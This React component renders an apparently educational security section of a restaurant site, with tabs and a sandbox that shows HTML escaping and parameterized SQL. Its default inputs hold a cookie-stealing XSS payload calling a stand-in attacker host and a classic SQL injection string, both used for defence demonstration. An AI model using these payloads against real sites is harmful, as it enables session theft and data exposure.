import React, { useState } from 'react';
import { Shield, Lock, Terminal, CheckCircle2, AlertTriangle, Eye, ShieldAlert, Cpu, Code } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { SECURITY_SECTIONS } from '../data';

export default function SecurityGuide() {
  const [activeTab, setActiveTab] = useState('sec-architecture');
  
  // XSS Sandbox State
  const [xssInput, setXssInput] = useState('<h1>Steal Cookies</h1> <script>fetch("https://attacker.com/steal?cookie=" + document.cookie)</script>');
  const [xssSanitized, setXssSanitized] = useState('');
  const [xssInspected, setXssInspected] = useState(false);

  // SQL Sandbox State
  const [sqlInput, setSqlInput] = useState("James' OR '1'='1");
  const [sqlResultConcatenated, setSqlResultConcatenated] = useState("");
  const [sqlResultBound, setSqlResultBound] = useState("");
  const [sqlInspected, setSqlInspected] = useState(false);

  // Helper Escape Function (XSS sanitizer)
  const runEscapeSanitizer = (input: string): string => {
    return input
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");
  };

  const handleXSSAudit = () => {
    const escaped = runEscapeSanitizer(xssInput);
    setXssSanitized(escaped);
    setXssInspected(true);
  };

  const handleSQLAudit = () => {
    // Generate concatenated query representation
    const unsafeQuery = `SELECT * FROM reservations WHERE name = '${sqlInput}';`;
    
    // Generate secure bound parameterized representation
    const safeQueryWithBinding = `SELECT * FROM reservations WHERE name = ?;  [Bound Value: "${sqlInput.replace(/'/g, "''")}"]`;

    setSqlResultConcatenated(unsafeQuery);
    setSqlResultBound(safeQueryWithBinding);
    setSqlInspected(true);
  };

  return (
    <section id="security-lab" className="py-24 bg-bistro-charcoal text-white relative overflow-hidden border-t border-bistro-gold/20">
      
      {/* Background visual accents */}
      <div className="absolute top-0 right-0 w-[500px] h-[500px] rounded-full bg-bistro-red/5 filter blur-[150px] pointer-events-none" />
      <div className="absolute bottom-0 left-0 w-[400px] h-[400px] rounded-full bg-bistro-gold/5 filter blur-[120px] pointer-events-none" />

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
        
        {/* Title */}
        <div className="text-center mb-16">
          <span className="font-cursive text-2xl text-bistro-gold">Cybersecurity & Code Lab</span>
          <h2 className="font-serif text-3xl sm:text-4xl font-bold text-white mt-2 tracking-tight flex items-center justify-center gap-3">
            <Shield className="w-8 h-8 text-bistro-gold animate-pulse" />
            <span>Underlying Security & Architecture</span>
          </h2>
          <p className="text-xs text-gray-400 max-w-2xl mx-auto mt-4 leading-relaxed">
            For educational research: examine the structured architecture of this React+Vite app, analyze cryptographic protocols, and audit live injection defenses.
          </p>
          <div className="w-16 h-0.5 bg-bistro-gold mx-auto mt-4" />
        </div>

        {/* Core Layout: Side Tabs + Tab Content */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-10 items-stretch mb-20">
          
          {/* Left Side Tab Buttons (4 cols) */}
          <div className="lg:col-span-4 flex flex-col gap-3">
            {SECURITY_SECTIONS.map((section) => (
              <button
                key={section.id}
                onClick={() => setActiveTab(section.id)}
                className={`w-full text-left p-5 rounded-2xl border transition-all duration-200 cursor-pointer flex items-start gap-4 ${
                  activeTab === section.id
                    ? 'bg-bistro-gold/15 border-bistro-gold text-white shadow-lg'
                    : 'bg-zinc-900/50 border-white/5 text-gray-400 hover:bg-zinc-900 hover:border-white/10'
                }`}
              >
                <div className={`p-2 rounded-xl mt-0.5 ${
                  activeTab === section.id ? 'bg-bistro-gold text-bistro-charcoal' : 'bg-white/5 text-gray-300'
                }`}>
                  <Lock className="w-4 h-4" />
                </div>
                <div>
                  <span className="text-[9px] font-extrabold tracking-widest text-bistro-gold uppercase block">
                    {section.badge}
                  </span>
                  <h4 className="text-sm font-serif font-bold mt-1">
                    {section.title}
                  </h4>
                </div>
              </button>
            ))}
          </div>

          {/* Right Side Content Pane (8 cols) */}
          <div className="lg:col-span-8 bg-zinc-900/60 rounded-3xl border border-white/10 p-8 flex flex-col justify-between">
            <AnimatePresence mode="wait">
              {SECURITY_SECTIONS.map((section) => {
                if (section.id !== activeTab) return null;
                return (
                  <motion.div
                    key={section.id}
                    initial={{ opacity: 0, x: 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: -20 }}
                    transition={{ duration: 0.25 }}
                    className="space-y-4"
                  >
                    <div className="flex justify-between items-center pb-4 border-b border-white/10">
                      <div>
                        <h3 className="text-xl font-serif font-bold text-bistro-gold">
                          {section.title}
                        </h3>
                        <p className="text-xs text-gray-400 mt-1">{section.subtitle}</p>
                      </div>
                      <span className="text-[9px] font-black tracking-widest uppercase bg-bistro-red text-white px-3 py-1 rounded-full">
                        SECURE LOGIC
                      </span>
                    </div>

                    {/* Markdown rendering simulation (beautiful pre-styled text layout) */}
                    <div className="text-xs text-gray-300 leading-relaxed whitespace-pre-wrap font-sans space-y-4 pt-2 prose prose-invert max-w-none">
                      {/* Sub-formatting headings directly in render */}
                      {section.content.split('###').map((block, bIdx) => {
                        if (bIdx === 0) return <p key={bIdx} dangerouslySetInnerHTML={{ __html: block.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>').replace(/\`(.*?)\`/g, '<code class="bg-white/5 px-1 py-0.5 rounded text-bistro-gold font-mono text-[10px]">$1</code>') }} />;
                        
                        const lines = block.split('\n');
                        const header = lines[0];
                        const body = lines.slice(1).join('\n');

                        return (
                          <div key={bIdx} className="mt-4">
                            <h5 className="font-serif font-bold text-sm text-white mt-4 mb-2 flex items-center gap-1.5">
                              <span className="w-1.5 h-1.5 rounded-full bg-bistro-gold" />
                              {header}
                            </h5>
                            <p dangerouslySetInnerHTML={{ __html: body.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>').replace(/\`(.*?)\`/g, '<code class="bg-white/5 px-1 bg-neutral-900 py-0.5 rounded text-bistro-gold font-mono text-[10px]">$1</code>') }} />
                          </div>
                        );
                      })}
                    </div>
                  </motion.div>
                );
              })}
            </AnimatePresence>
          </div>

        </div>

        {/* INTERACTIVE SECURITY SANDBOX THREAT PLAYGROUND */}
        <div className="bg-zinc-950/80 rounded-3xl border border-bistro-gold/25 p-8 sm:p-10 shadow-2xl relative overflow-hidden">
          
          {/* Cyber stamp decorator */}
          <div className="absolute top-4 right-6 text-gray-700 font-mono text-[10px] tracking-widest uppercase select-none font-bold">
            [ ENVIRONMENT_SANDBOX_ACTIVE ]
          </div>

          <div className="flex items-center gap-2 mb-4">
            <Terminal className="w-5 h-5 text-bistro-red" />
            <h3 className="font-serif text-lg font-bold text-white">
              Live Threat Playground (Educational Sandbox)
            </h3>
          </div>
          <p className="text-xs text-gray-400 mb-8 max-w-3xl leading-relaxed">
            Test the system defenses live. Enter malicious payloads in the modules below and trigger audits to inspect real-time neutralizing, escaping, and parameterized query compilation.
          </p>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-10">
            
            {/* Playground Column A: XSS Filter */}
            <div className="bg-zinc-900/40 p-6 rounded-2xl border border-white/5 space-y-4">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-bold text-bistro-gold uppercase tracking-wider block">
                  MODULE 1: Cross-Site Scripting (XSS) Prevention
                </span>
                <span className="text-[8px] bg-amber-400/10 text-amber-400 border border-amber-400/20 px-2 py-0.5 rounded font-mono font-bold uppercase">
                  Escaping Filter
                </span>
              </div>

              <div>
                <label className="block text-[10px] text-gray-400 mb-2 font-mono">
                  Input Raw Malicious Code Payload:
                </label>
                <textarea
                  value={xssInput}
                  onChange={(e) => setXssInput(e.target.value)}
                  rows={3}
                  className="w-full bg-neutral-950 border border-neutral-800 rounded-2xl p-4 font-mono text-[11px] text-amber-500 focus:outline-none focus:ring-2 focus:ring-amber-500/35 focus:border-amber-500 leading-normal shadow-inner shadow-black/80 transition-all duration-300 placeholder-neutral-700"
                  placeholder="e.g. <script>alert(document.cookie)</script>"
                />
              </div>

              <button
                onClick={handleXSSAudit}
                className="w-full bg-bistro-red hover:bg-bistro-gold hover:text-bistro-charcoal text-white font-bold text-xs py-2.5 rounded-xl uppercase tracking-wider transition-colors duration-200 cursor-pointer flex items-center justify-center gap-1.5"
              >
                <Cpu className="w-3.5 h-3.5" />
                <span>Audit XSS HTML-Escape</span>
              </button>

              <AnimatePresence>
                {xssInspected && (
                  <motion.div
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: 'auto' }}
                    className="space-y-3 pt-3 border-t border-white/5"
                  >
                    <div>
                      <span className="block text-[9px] text-gray-500 font-bold uppercase mb-1">
                        How Browser compiles Sanitized Output:
                      </span>
                      {/* Sanitized raw string rendering representation */}
                      <div className="bg-black/80 rounded-lg p-3 font-mono text-[10px] text-emerald-400 border border-emerald-500/15 overflow-x-auto whitespace-nowrap">
                        {xssSanitized}
                      </div>
                    </div>

                    <div className="p-3 bg-emerald-500/5 rounded-xl border border-emerald-500/25 flex gap-2 items-start text-[11px] text-gray-300">
                      <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0 mt-0.5" />
                      <span>
                        <strong>Defended:</strong> The payload's script structures are converted into harmless literal text sequences (\`&lt;\`, \`&gt;\`). The browser is rendered completely unable to execute the JavaScript code!
                      </span>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

            {/* Playground Column B: SQL Injection */}
            <div className="bg-zinc-900/40 p-6 rounded-2xl border border-white/5 space-y-4">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-bold text-bistro-gold uppercase tracking-wider block">
                  MODULE 2: SQL Injection Protection
                </span>
                <span className="text-[8px] bg-red-400/10 text-red-400 border border-red-400/20 px-2 py-0.5 rounded font-mono font-bold uppercase">
                  Prepared Statement
                </span>
              </div>

              <div>
                <label className="block text-[10px] text-gray-400 mb-2 font-mono">
                  Input SQL Concatenation Exploit:
                </label>
                <input
                  type="text"
                  value={sqlInput}
                  onChange={(e) => setSqlInput(e.target.value)}
                  className="w-full bg-black/60 border border-white/10 rounded-xl p-3 font-mono text-[10.5px] text-amber-500 focus:outline-none focus:ring-1 focus:ring-bistro-gold focus:border-bistro-gold"
                />
              </div>

              <button
                onClick={handleSQLAudit}
                className="w-full bg-bistro-red hover:bg-bistro-gold hover:text-bistro-charcoal text-white font-bold text-xs py-2.5 rounded-xl uppercase tracking-wider transition-colors duration-200 cursor-pointer flex items-center justify-center gap-1.5"
              >
                <Code className="w-3.5 h-3.5" />
                <span>Analyze SQL Parameter Binding</span>
              </button>

              <AnimatePresence>
                {sqlInspected && (
                  <motion.div
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: 'auto' }}
                    className="space-y-3.5 pt-3 border-t border-white/5 text-xs"
                  >
                    <div>
                      <div className="flex justify-between items-center mb-1">
                        <span className="text-[9px] text-red-400 font-bold uppercase">
                          ❌ Vulnerable String-Concatenation Query:
                        </span>
                        <AlertTriangle className="w-3 h-3 text-red-400" />
                      </div>
                      <div className="bg-red-950/10 border border-red-500/25 rounded-lg p-2.5 font-mono text-[9.5px] text-red-300 overflow-x-auto leading-normal">
                        {sqlResultConcatenated}
                      </div>
                      <p className="text-[8.5px] text-red-400/80 mt-1 leading-normal">
                        Notice how the raw string alters the SQL logic structural outline (\`OR '1'='1\` is evaluated, exposing all table user entries!).
                      </p>
                    </div>

                    <div>
                      <div className="flex justify-between items-center mb-1">
                        <span className="text-[9px] text-emerald-400 font-bold uppercase">
                          ✅ Secure Parameterized Query Structure:
                        </span>
                        <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                      </div>
                      <div className="bg-emerald-950/10 border border-emerald-500/25 rounded-lg p-2.5 font-mono text-[9.5px] text-emerald-300 overflow-x-auto leading-normal">
                        {sqlResultBound}
                      </div>
                      <p className="text-[8.5px] text-emerald-400/80 mt-1 leading-normal">
                        The DB query schema is compiled *first* with parameters placeholder (\`?\`). The exploit input is isolated safely as raw text, preventing logical escalation.
                      </p>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

          </div>

        </div>

      </div>
    </section>
  );
}
